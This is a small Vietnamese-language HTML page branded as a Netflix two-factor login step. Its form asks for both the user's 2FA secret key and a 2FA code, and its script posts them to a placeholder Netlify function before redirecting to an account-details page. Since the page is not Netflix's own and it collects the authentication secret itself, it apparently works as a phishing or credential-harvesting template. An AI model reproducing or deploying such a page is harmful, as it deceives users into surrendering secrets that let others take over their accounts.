<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nhập Mã 2FA để Đăng Nhập Netflix</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f8f9fa;
        }
        h1 {
            color: #333;
        }
        form {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            margin: auto;
        }
        label {
            font-size: 16px;
            margin-bottom: 8px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        #responseMessage {
            margin-top: 20px;
            text-align: center;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <h1>Nhập Mã 2FA để Đăng Nhập Netflix</h1>
    <form id="2faForm">
        <label for="2faKey">Khóa 2FA:</label>
        <input type="text" id="2faKey" name="2faKey" required placeholder="Nhập khóa 2FA của bạn">
        
        <label for="2faCode">Mã 2FA:</label>
        <input type="text" id="2faCode" name="2faCode" required placeholder="Nhập mã 2FA">
        
        <button type="submit">Xác thực</button>
    </form>

    <div id="responseMessage"></div>

    <script>
        document.getElementById('2faForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const key = document.getElementById('2faKey').value;
            const code = document.getElementById('2faCode').value;

            fetch('https://your-netlify-site.netlify.app/.netlify/functions/verify-2fa', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ key: key, code: code }),
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('responseMessage').innerText = data.message;
                if (data.success) {
                    // Redirect to Netflix account details or show them here
                    window.location.href = '/account-details'; // Redirect đến trang tài khoản Netflix
                }
            })
            .catch(error => {
                document.getElementById('responseMessage').innerText = 'Có lỗi xảy ra. Vui lòng thử lại.';
            });
        });
    </script>
</body>
</html>
